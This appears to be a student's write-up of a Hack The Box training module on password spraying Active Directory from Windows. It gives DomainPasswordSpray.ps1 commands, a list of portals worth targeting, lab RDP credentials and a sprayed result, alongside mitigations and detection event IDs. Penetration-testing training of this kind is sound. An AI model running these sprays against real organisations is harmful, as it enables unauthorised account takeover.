### CPTS / HTB Penetration Tester Path <br>
### Active Directory Enumeration & Attacks: Internal Password Spraying: from Windows <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Internal Password Spraying: from Windows

`DomainPasswordSpray.ps1` (from a domain-joined host) auto-pulls the user list + lockout policy + skips near-lockout accounts:

```diff
+ PS> Import-Module .\DomainPasswordSpray.ps1
+ PS> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

<br>

Kerbrute also works from Windows (binary in `C:\Tools`).

<br>

---

<br>

### Mitigations

| Technique | Description |
|---|---|
| `Multi-factor Auth` | OTP / push / hardware token. Some implementations still leak valid creds: cover all external portals. |
| `Restrict Access` | Least privilege on app login (not every domain user needs every app). |
| `Reduce Impact` | Separate admin accounts, app-specific perms, network segmentation. |
| `Password Hygiene` | Educate on passphrases; password filter to block months/seasons/company name/dictionary words. |

<br>

---

<br>

### Detection

Watch for:
- Many lockouts in short window
- Server/app log floods of failed logins (existing or non-existent users)
- Many requests to one URL/portal
- Domain Controller security log: many `4625` (failed logon)
- LDAP-targeted spray: `4771` (Kerberos pre-auth failed): needs Kerberos logging enabled

<br>

---

<br>

### External Spraying Targets

Common AD-backed external portals worth spraying:
- O365
- OWA / EWS
- Skype for Business / Lync
- RDS portals
- Citrix portals (AD auth)
- VDI (VMware Horizon, etc.)
- VPN portals (Citrix, SonicWall, OpenVPN, Fortinet)
- Custom AD-backed web apps

<br>

---

<br>

### Internal Spray from Windows Exercise

IP: 10.129.52.120

RDP `htb-student:Academy_student_AD!`.

---

### Question 1:
Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer.

#### RDP in, escalate PS, import DomainPasswordSpray, spray Winter2022.

```diff
+ $ xfreerdp /v:10.129.52.120 /u:htb-student /p:'Academy_student_AD!' /dynamic-resolution
+ PS> cd C:\Tools
+ PS> Import-Module .\DomainPasswordSpray.ps1
+ PS> Invoke-DomainPasswordSpray -Password Winter2022 -OutFile happyspray -ErrorAction SilentlyContinue
```

	[*] SUCCESS! User:dbranch Password:Winter2022

&#x1F6A9; found **dbra--edit--**.
